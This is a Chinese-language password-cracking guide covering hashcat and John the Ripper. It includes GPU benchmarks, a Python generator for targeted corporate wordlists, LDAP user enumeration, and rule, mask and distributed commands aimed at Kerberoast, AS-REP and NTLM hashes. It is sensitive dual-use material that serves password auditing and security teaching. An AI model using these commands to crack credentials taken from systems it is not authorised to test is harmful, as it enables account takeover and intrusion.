# 密码破解进阶指南

> 对 hash-cracking.md 的补充深化: 多 hash 类型 GPU 基准、高级字典工程、规则文件适用场景详解、分布式破解策略

---

## 1. 多 Hash 类型 GPU 基准速度

### RTX 4090 基准 (-O -w 3)

| hashcat -m | Hash 类型 | 近似速度 | 典型场景 |
|------------|-----------|----------|----------|
| 1000 | NTLM | ~120 GH/s | SAM/secretsdump 提取 |
| 5600 | NetNTLMv2 | ~4.5 GH/s | Responder/relay 捕获 |
| 13100 | Kerberos TGS RC4 | ~1.2 GH/s | Kerberoasting |
| 18200 | Kerberos AS-REP RC4 | ~1.0 GH/s | AS-REP Roasting |
| 19700 | Kerberos TGS AES256 | ~200 KH/s | AES 强制域 |
| 19600 | Kerberos TGS AES128 | ~400 KH/s | AES 域 |
| 3000 | LM | ~80 GH/s | 旧系统遗留 |
| 5500 | NetNTLMv1 | ~40 GH/s | 降级攻击捕获 |
| 22000 | WPA-PBKDF2 | ~1.5 MH/s | 无线审计 |
| 3200 | bcrypt | ~180 KH/s | Web 应用 hash |
| 1800 | sha512crypt | ~2.5 MH/s | Linux /etc/shadow |
| 500 | md5crypt | ~40 MH/s | 旧 Linux/BSD |
| 7500 | Kerberos AS-REQ etype 23 | ~600 MH/s | Pre-auth hash |

### 多卡扩展参考

```
GPU 数量与速度的关系（近似线性）:
├─ 1x RTX 4090 → 1.2 GH/s (13100)
├─ 2x RTX 4090 → 2.3 GH/s
├─ 4x RTX 4090 → 4.5 GH/s
└─ 8x RTX 4090 → 8.8 GH/s

云 GPU 参考:
├─ 1x A100 80GB → ~800 MH/s (13100)
├─ 8x A100 (p4d.24xlarge) → ~6 GH/s (13100)
└─ 注意: 云实例按小时计费，短时间爆破更经济
```

### 跨 Hash 类型破解难度对比

```
从易到难（以 8 位 大小写+数字 密码为基准，单卡 RTX 4090）:

NTLM (1000)       → ~30 分钟     ████░░░░░░
NetNTLMv1 (5500)   → ~1.5 小时   ██████░░░░
NetNTLMv2 (5600)   → ~14 小时    ████████░░
KRB TGS RC4 (13100) → ~2 天     █████████░
KRB AS-REP (18200)  → ~2.5 天   █████████░
KRB TGS AES (19700) → ~35 年    ██████████  (不可行)
bcrypt (3200)       → ~40 年     ██████████  (不可行)
```

---

## 2. 企业密码字典高级生成

### 2.1 密码模式频率统计（基于真实泄露库）

```
企业环境中最常见的密码构造模式:
├─ 40%  单词 + 数字 + 符号    (Password1!, Welcome2024@)
├─ 25%  公司名/缩写 + 年份     (Corp2024, ABC@2025)
├─ 15%  季节/月份 + 年份       (Spring2024!, January2025)
├─ 10%  键盘模式               (Qwer1234!, Zxcv@1234)
├─  5%  中文拼音相关            (Woaini520!, Nihao2024)
└─  5%  其他模式               (个人信息、生日等)
```

### 2.2 高级企业字典生成器

```python
#!/usr/bin/env python3
"""advanced_corp_wordlist.py — 多维度企业密码字典生成"""

import itertools
import sys

# ============ 配置区 — 根据目标修改 ============
COMPANY = {
    'full': ['TargetCorp', 'targetcorp', 'TARGETCORP'],
    'abbr': ['TC', 'tc', 'Tc'],
    'domain': ['target', 'Target'],
    'pinyin': [],  # 中文公司可加拼音: ['mubiao', 'MuBiao']
}

CITY = ['Beijing', 'Shanghai', 'Shenzhen', 'beijing']  # 办公城市
PRODUCTS = ['CloudX', 'DataHub']  # 产品名
CUSTOM_KEYWORDS = []  # 从 CeWL 或 OSINT 获取的关键词

# ============ 时间维度 ============
YEARS = [str(y) for y in range(2020, 2027)]
SHORT_YEARS = ['20', '21', '22', '23', '24', '25', '26']
SEASONS_EN = ['Spring', 'Summer', 'Autumn', 'Winter',
              'spring', 'summer', 'autumn', 'winter']
SEASONS_CN_PY = ['Chun', 'Xia', 'Qiu', 'Dong']
MONTHS_EN = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
             'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec',
             'January', 'February', 'March', 'April',
             'May', 'June', 'July', 'August',
             'September', 'October', 'November', 'December']
MONTHS_NUM = [f'{m:02d}' for m in range(1, 13)]

# ============ 连接符和后缀 ============
SEPS = ['', '@', '#', '!', '_', '.', '$']
SUFFIXES = ['', '!', '@', '#', '!!', '@#', '!@#', '#@!', '123', '1234', '!@#$']

# ============ 常见弱密码基词 ============
COMMON_BASES = [
    'Password', 'password', 'P@ssw0rd', 'Welcome', 'welcome',
    'Qwer', 'qwer', 'Admin', 'admin', 'Root', 'root',
    'Test', 'test', 'Temp', 'temp', 'Letmein', 'letmein',
    'Monday', 'Tuesday', 'Friday', 'Hello', 'Love',
    'Passw0rd', 'Pa$$w0rd', 'P@ss', 'Change', 'Changeme',
]

# ============ 键盘模式 ============
KEYBOARD = [
    'qwer', 'Qwer', 'QWER', 'qwerty', 'Qwerty',
    'asdf', 'Asdf', 'zxcv', 'Zxcv',
    'qaz', 'Qaz', 'wsx', 'Wsx',
    '1qaz', '2wsx', '!QAZ', '@WSX',
    'qwer1234', 'Qwer1234', 'asdf1234',
    '1q2w3e', '1Q2W3E', '1q2w3e4r',
]

def generate():
    passwords = set()

    all_names = (COMPANY['full'] + COMPANY['abbr'] +
                 COMPANY['domain'] + COMPANY.get('pinyin', []))
    all_time = SEASONS_EN + SEASONS_CN_PY + MONTHS_EN
    all_bases = all_names + CITY + PRODUCTS + CUSTOM_KEYWORDS + COMMON_BASES

    # 模式 1: 基词 + 分隔符 + 年份 + 后缀
    for base, sep, year, suf in itertools.product(all_bases, SEPS[:4], YEARS, SUFFIXES[:6]):
        p = f'{base}{sep}{year}{suf}'
        if 6 <= len(p) <= 20:
            passwords.add(p)

    # 模式 2: 时间词 + 年份 + 后缀
    for time_w, year, suf in itertools.product(all_time, YEARS, SUFFIXES[:5]):
        passwords.add(f'{time_w}{year}{suf}')

    # 模式 3: 月份号 + 年份组合 (202401, 2024-01)
    for m, y in itertools.product(MONTHS_NUM, YEARS):
        for base in all_names:
            passwords.add(f'{base}{y}{m}')
            passwords.add(f'{base}{m}{y}')

    # 模式 4: 键盘模式 + 后缀
    for kb, suf in itertools.product(KEYBOARD, SUFFIXES[:4]):
        passwords.add(f'{kb}{suf}')

    # 模式 5: 常见固定弱密码
    fixed = [
        'Welcome1!', 'P@ssw0rd', 'P@ssw0rd1', 'P@ssword1!',
        'Password1', 'Password1!', 'Qwer1234!', 'Admin@123',
        'Changeme1!', 'Monday1!', 'Letmein1!', 'Root@123',
        'Admin123!', 'Test1234!', 'Temp1234!', '!@#$%^&*()',
        'Aa123456!', 'Aa123456', '1234Qwer', 'Abc@1234',
    ]
    passwords.update(fixed)

    return passwords

if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'advanced_corp_wordlist.txt'
    pws = generate()
    with open(out, 'w') as f:
        for p in sorted(pws):
            f.write(p + '\n')
    print(f'[+] 生成 {len(pws)} 个密码候选 → {out}')
```

### 2.3 从 AD 信息辅助字典生成

```bash
# 用户描述字段（经常包含默认密码或密码提示）
netexec ldap DC_IP -u USER -p PASS --users 2>/dev/null | tee ad_users.txt

# 提取用户名作为字典基词（很多用户以自己用户名为密码基础）
awk '{print $5}' ad_users.txt > usernames.txt

# 用户名变体生成
while read -r name; do
    echo "${name}"
    echo "${name}123"
    echo "${name}1234"
    echo "${name}@123"
    echo "${name}2024!"
    echo "${name}2025!"
    echo "$(echo ${name} | sed 's/^./\U&/')1!"
done < usernames.txt >> username_variants.txt
```

---

## 3. 规则文件适用场景详解

### 3.1 规则文件对比与选择

| 规则文件 | 条数 | 耗时系数 | 最佳适用场景 | 不适用场景 |
|----------|------|----------|-------------|------------|
| **best64.rule** | 77 | 1x | 快速初筛、时间紧迫、AES hash | 已用过且无结果 |
| **rockyou-30000.rule** | 30K | 400x | 中等时间预算、通用场景 | AES hash（太慢） |
| **OneRuleToRuleThemAll** | 52K | 700x | 充足时间、综合最优投入产出比 | 短时间任务 |
| **dive.rule** | 120K+ | 1600x | 最后手段、高价值目标、过夜跑 | 日常破解 |
| **d3ad0ne.rule** | 34K | 450x | 通用补充、与 best64 互补 | 与 OneRule 重复 |
| **T0XlC.rule** | 12K | 160x | 中等规模、leet speak 变体 | 纯数字密码 |
| **pantagrule** | 按级别 | 可变 | 基于统计的科学规则、泄露库学习 | 企业特定模式 |
| **toggles[1-5].rule** | 可变 | 可变 | 大小写混合穷举 | 已知首字母大写 |

### 3.2 推荐破解工作流（按时间预算）

```
时间预算: 5 分钟
├─ hashcat ... corp_wordlist.txt -r best64.rule
└─ hashcat ... rockyou.txt (无规则)

时间预算: 1 小时
├─ hashcat ... corp_wordlist.txt -r best64.rule
├─ hashcat ... rockyou.txt -r best64.rule
└─ hashcat ... corp_wordlist.txt -r rockyou-30000.rule

时间预算: 8 小时（过夜）
├─ hashcat ... corp_wordlist.txt -r OneRuleToRuleThemAll.rule
├─ hashcat ... rockyou.txt -r OneRuleToRuleThemAll.rule
├─ hashcat ... -a 6 corp_base.txt '?d?d?d?d?s'  (混合)
└─ hashcat ... -a 3 '?u?l?l?l?l?l?d?d?d?d?s'    (掩码)

时间预算: 48 小时（周末跑）
├─ 以上全部
├─ hashcat ... weakpass_3.txt -r dive.rule
├─ hashcat ... -a 3 '?a?a?a?a?a?a?a?a' --increment (8位全字符暴力)
└─ 多规则叠加: -r best64.rule -r toggles1.rule
```

### 3.3 规则叠加原理

```bash
# 单规则: 字典词数 × 规则数 = 候选数
# corp_wordlist.txt (5000词) × best64.rule (77条) = 385,000 候选

# 双规则叠加: 字典词数 × 规则1条数 × 规则2条数 = 候选数
# corp_wordlist.txt (5000) × best64 (77) × toggles1 (15) = 5,775,000 候选
hashcat -m 13100 hashes.txt corp_wordlist.txt \
  -r best64.rule -r toggles1.rule -O -w 3

# ⛔ 注意: 三层叠加通常过多，导致运行时间爆炸
# best64 × rockyou-30000 × toggles3 = 完全不可行
```

### 3.4 自定义企业规则模板

```bash
# 保存为 enterprise.rule
# === 基础变换 ===
:           # 保持原样
c           # 首字母大写
u           # 全大写
l           # 全小写

# === 年份追加（最常见企业模式）===
c $2 $0 $2 $4
c $2 $0 $2 $5
c $2 $0 $2 $6
c $2 $0 $2 $4 $!
c $2 $0 $2 $5 $!
c $2 $0 $2 $6 $!
c $@ $2 $0 $2 $4
c $@ $2 $0 $2 $5
c $@ $2 $0 $2 $6

# === 数字+符号后缀 ===
c $1 $!
c $1 $2 $3
c $1 $2 $3 $!
c $@ $1 $2 $3
c $! $@ $#
$1 $2 $3 $4
$1 $2 $3 $4 $!

# === Leet speak 替换 ===
c s a @ s e 3 s o 0
c s a @ s i 1
s a @ s s $
s e 3 s o 0 s i 1

# === 前缀添加（密码策略要求大写开头时）===
c ^! ^2 ^1 ^@    # @12!Password 模式 (反转)
```

```bash
# 使用自定义规则
hashcat -m 13100 hashes.txt corp_base.txt -r enterprise.rule -O -w 3
```

---

## 4. 高级掩码策略

### 4.1 基于密码策略的精确掩码

```bash
# === 策略: 最小 8 位，需大写+小写+数字+符号 ===

# 最常见满足方式: Ulllllld?s (首字母大写 + 小写 + 1数字 + 1符号)
hashcat -m 13100 h.txt -a 3 '?u?l?l?l?l?l?d?s' -O -w 3

# 变体: UlllllddS (首大写 + 小写 + 2数字 + 1符号)
hashcat -m 13100 h.txt -a 3 '?u?l?l?l?l?l?d?d?s' -O -w 3

# 自定义字符集缩小范围
# -1 定义只包含常见尾部符号
hashcat -m 13100 h.txt -a 3 -1 '!@#$' '?u?l?l?l?l?l?d?1' -O -w 3

# === 策略: 最小 10 位 ===
# 常见: 单词(6) + 年份(4) 或 单词(6) + 年份(4) + 符号(1)
hashcat -m 13100 h.txt -a 3 '?u?l?l?l?l?l?d?d?d?d' -O -w 3
hashcat -m 13100 h.txt -a 3 '?u?l?l?l?l?l?d?d?d?d?s' -O -w 3
```

### 4.2 .hcmask 文件批量掩码

```bash
# 保存为 enterprise.hcmask — hashcat 自动按顺序执行每行掩码
# 格式: [自定义字符集,]掩码

# 8 位常见企业模式
?u?l?l?l?l?l?d?s
?u?l?l?l?l?l?d?d
?u?l?l?l?l?d?d?s

# 9 位
?u?l?l?l?l?l?l?d?s
?u?l?l?l?l?l?d?d?s

# 10 位 (单词+年份)
?u?l?l?l?l?l?d?d?d?d
?u?l?l?l?l?l?d?d?d?d?s

# 自定义字符集: 尾部只试常见符号
!@#$,?u?l?l?l?l?l?d?1
!@#$,?u?l?l?l?l?l?d?d?1

# 使用
# hashcat -m 13100 hashes.txt -a 3 enterprise.hcmask -O -w 3
```

### 4.3 掩码攻击空间与时间估算公式

```
搜索空间 = 每位字符数的乘积
时间 = 搜索空间 / 每秒速度

示例 — ?u?l?l?l?l?l?d?s (模式 13100, 1.2 GH/s):
  = 26 × 26 × 26 × 26 × 26 × 26 × 10 × 33
  = 26^6 × 10 × 33
  = 308,915,776 × 330
  = 1.02 × 10^11
  → ~85 秒

示例 — ?u?l?l?l?l?l?d?d?d?d?s (模式 13100, 1.2 GH/s):
  = 26 × 26^5 × 10^4 × 33
  = 308,915,776 × 330,000
  = 1.02 × 10^14
  → ~23.6 小时

用自定义字符集缩小 ?s 为 !@#$ (4个字符):
  = 26^6 × 10^4 × 4
  = 1.24 × 10^13
  → ~2.9 小时  (缩小 8 倍)
```

---

## 5. 混合攻击进阶

### 5.1 多轮混合策略

```bash
# 第一轮: 企业基础词 + 短数字后缀
hashcat -m 13100 h.txt -a 6 corp_base.txt '?d?d' -O -w 3
hashcat -m 13100 h.txt -a 6 corp_base.txt '?d?d?d' -O -w 3
hashcat -m 13100 h.txt -a 6 corp_base.txt '?d?d?d?d' -O -w 3

# 第二轮: 基础词 + 年份 + 符号 (固定字符串追加)
hashcat -m 13100 h.txt -a 6 corp_base.txt '2024!' -O -w 3
hashcat -m 13100 h.txt -a 6 corp_base.txt '2025!' -O -w 3
hashcat -m 13100 h.txt -a 6 corp_base.txt '2026!' -O -w 3
hashcat -m 13100 h.txt -a 6 corp_base.txt '@2024' -O -w 3
hashcat -m 13100 h.txt -a 6 corp_base.txt '@2025' -O -w 3
hashcat -m 13100 h.txt -a 6 corp_base.txt '#2024' -O -w 3

# 第三轮: 数字前缀 + 基础词 (mode 7)
hashcat -m 13100 h.txt -a 7 '?d?d?d?d' corp_base.txt -O -w 3
hashcat -m 13100 h.txt -a 7 '2024' corp_base.txt -O -w 3
hashcat -m 13100 h.txt -a 7 '2025' corp_base.txt -O -w 3
```

### 5.2 Combinator 攻击 (模式 1)

```bash
# 两个字典的笛卡尔积
# 适合拼接攻击: 左词 + 右词

# 基础词 + 后缀词
cat <<'EOF' > left.txt
Password
Welcome
Company
Admin
Service
Spring
Summer
Winter
EOF

cat <<'EOF' > right.txt
123!
1234!
2024!
2025!
@123
#123
!@#
EOF

hashcat -m 13100 h.txt -a 1 left.txt right.txt -O -w 3

# 加规则到 combinator (左侧/右侧分别应用)
hashcat -m 13100 h.txt -a 1 left.txt right.txt -j 'c' -O -w 3
# -j: 对左侧词应用规则 (c=首字母大写)
# -k: 对右侧词应用规则
```

---

## 6. John the Ripper 进阶用法

### 6.1 完整的 Kerberos hash 破解命令

```bash
# === Kerberoasting ===

# RC4 — 字典
john --format=krb5tgs kerberoast.txt --wordlist=corp_wordlist.txt

# RC4 — 字典 + 规则
john --format=krb5tgs kerberoast.txt --wordlist=corp_wordlist.txt --rules=best64
john --format=krb5tgs kerberoast.txt --wordlist=corp_wordlist.txt --rules=KoreLogicRulesAppend4Num

# AES256 — 必须指定格式
john --format=krb5tgs-aes kerberoast_aes.txt --wordlist=corp_wordlist.txt

# === AS-REP Roasting ===
john --format=krb5asrep asrep.txt --wordlist=corp_wordlist.txt
john --format=krb5asrep asrep.txt --wordlist=corp_wordlist.txt --rules=best64

# === NTLM (secretsdump 提取) ===
john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt

# === NetNTLMv2 (Responder 捕获) ===
john --format=netntlmv2 captured.txt --wordlist=corp_wordlist.txt
```

### 6.2 John 掩码与混合模式

```bash
# 掩码攻击 (John 语法)
john --format=krb5tgs h.txt --mask='?u?l?l?l?l?l?d?d?d?d'

# 字典 + 掩码混合 (?w = 字典词)
john --format=krb5tgs h.txt --wordlist=corp_base.txt --mask='?w?d?d?d?d'
john --format=krb5tgs h.txt --wordlist=corp_base.txt --mask='?w?d?d?d?d?s'

# 自定义字符集
john --format=krb5tgs h.txt --mask='?u?l?l?l?l?l[0-9][!@#$]'

# 增量模式（纯暴力）
john --format=krb5tgs h.txt --incremental=Alnum --max-length=8
john --format=krb5tgs h.txt --incremental=ASCII --min-length=8 --max-length=10
```

### 6.3 John 特有优势场景

```bash
# 1. 自动检测 hash 类型（不确定 hash 格式时）
john --list=formats | grep -i kerb
john hash.txt  # 自动检测

# 2. Loopback 攻击（使用已破解密码作为字典）
john --format=krb5tgs h.txt --loopback --rules=best64

# 3. Prince 模式（密码短语生成）
john --format=krb5tgs h.txt --prince=wordlist.txt --prince-min-len=8

# 4. 外部过滤器（自定义密码生成逻辑）
john --format=krb5tgs h.txt --external=Filter_Policy
# 需在 john.conf 中定义过滤规则

# 5. Fork 多核并行（CPU 场景）
john --format=krb5tgs h.txt --wordlist=big.txt --rules=best64 --fork=8
```

---

## 7. 暴力破解详细时间表

### RC4 (13100) — RTX 4090 × 1 (~1.2 GH/s)

| 长度 | 纯数字 (10) | 小写 (26) | 小写+数字 (36) | 大小写+数字 (62) | 全可打印 (95) |
|------|------------|-----------|---------------|----------------|--------------|
| 4 | 即时 | 即时 | 即时 | 即时 | 即时 |
| 5 | 即时 | 即时 | 即时 | 即时 | 即时 |
| 6 | 即时 | 即时 | ~2 秒 | ~47 秒 | ~12 分钟 |
| 7 | 即时 | ~7 秒 | ~65 秒 | ~49 分钟 | ~19 小时 |
| 8 | 即时 | ~3 分钟 | ~39 分钟 | ~2 天 | ~76 天 |
| 9 | ~1 秒 | ~82 分钟 | ~23 小时 | ~134 天 | ~20 年 |
| 10 | ~8 秒 | ~36 小时 | ~35 天 | ~22 年 | ~1884 年 |
| 11 | ~83 秒 | ~38 天 | ~3.4 年 | ~1390 年 | - |
| 12 | ~14 分钟 | ~2.7 年 | ~124 年 | - | - |

### AES256 (19700) — RTX 4090 × 1 (~200 KH/s)

| 长度 | 纯数字 | 小写+数字 | 大小写+数字 |
|------|--------|-----------|------------|
| 6 | ~5 秒 | ~3 小时 | ~9 天 |
| 7 | ~50 秒 | ~4.5 天 | ~1.5 年 |
| 8 | ~8 分钟 | ~163 天 | ~95 年 |
| 9 | ~83 分钟 | ~16 年 | - |

### NTLM (1000) — RTX 4090 × 1 (~120 GH/s)

| 长度 | 小写+数字 | 大小写+数字 | 全可打印 |
|------|-----------|------------|----------|
| 7 | 即时 | 即时 | ~12 秒 |
| 8 | 即时 | ~1.8 秒 | ~18 分钟 |
| 9 | ~3 秒 | ~2 分钟 | ~29 小时 |
| 10 | ~2 分钟 | ~2 小时 | ~115 天 |
| 11 | ~64 分钟 | ~5 天 | ~30 年 |

> 结论: NTLM 对 10 位以下密码暴力可行; Kerberos RC4 对 8 位以下可行; AES256 只能依赖字典+规则。

---

## 8. hashcat 实战技巧

### 8.1 破解进度监控与恢复

```bash
# 命名会话（便于恢复）
hashcat -m 13100 h.txt wordlist.txt -r best64.rule --session=kerb_phase1 -O -w 3

# 恢复中断的会话
hashcat --session=kerb_phase1 --restore

# 运行中按键操作
# s     → 显示状态
# p     → 暂停
# r     → 恢复
# b     → 跳过当前规则/掩码
# q     → 保存并退出
# c     → checkpoint（保存进度）
```

### 8.2 已破解密码二次利用

```bash
# 查看所有已破解的 hash
hashcat -m 13100 h.txt --show

# 提取纯密码
hashcat -m 13100 h.txt --show --outfile-format=2 -o cracked_passwords.txt

# 用已破解密码 + 规则攻击剩余 hash（密码复用模式）
hashcat -m 13100 h.txt -a 0 cracked_passwords.txt -r best64.rule -O -w 3

# 跨 hash 类型复用（同域用户可能重复密码）
hashcat -m 18200 asrep.txt -a 0 cracked_passwords.txt -r best64.rule -O -w 3
```

### 8.3 分布式破解

```bash
# hashcat brain server（中心化去重）
# Server:
hashcat --brain-server --brain-host=0.0.0.0 --brain-port=13743 \
  --brain-password=SecretBrainPass

# Client (多台):
hashcat -m 13100 h.txt wordlist.txt -O -w 3 \
  --brain-client --brain-host=SERVER_IP --brain-port=13743 \
  --brain-password=SecretBrainPass

# 手动分片（无 brain server 时）
# 机器 1:
hashcat -m 13100 h.txt -a 3 '?a?a?a?a?a?a?a?a' --skip=0 --limit=50000000000 -O -w 3
# 机器 2:
hashcat -m 13100 h.txt -a 3 '?a?a?a?a?a?a?a?a' --skip=50000000000 --limit=50000000000 -O -w 3
```

---

## 参考链接

- [Hashcat Wiki - Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Hashcat Benchmark Results](https://gist.github.com/Chick3nman/32e662a5d9f1c1b87f5f7325fcb63d36)
- [OneRuleToRuleThemAll - GitHub](https://github.com/NotSoSecure/password_cracking_rules)
- [pantagrule - GitHub](https://github.com/rarecoil/pantagrule)
- [Weakpass Wordlists](https://weakpass.com/)
- [CrackStation Wordlists](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
